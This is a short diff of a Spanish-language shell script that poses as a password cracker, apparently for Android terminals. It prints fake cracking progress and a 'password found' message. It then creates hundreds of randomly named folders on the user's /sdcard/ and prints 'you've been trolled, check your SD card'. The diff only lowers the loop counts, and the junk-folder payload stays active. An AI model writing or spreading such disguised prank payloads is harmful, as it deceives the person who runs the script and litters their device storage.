@@ -141,11 +141,11 @@ printf "\e[1;35mIntentando contraseña:\e[1;31m 58/2550\n"
 printf "\e[1;32mPASS FOUND.. 58/2550\n"
 printf "\e[1;35mObteniendo los datos.. espere..\n"
 cd /sdcard/
-for i in {1..50000}
+for i in {1..500}
 do
  mkdir ${RANDOM}.${RANDOM}
 done
-for i in {1..100}
+for i in {1..10}
 do
  printf "\e[1;35mHAS SIDO TROLEADO REVISA TU SDCARD\n"
 done
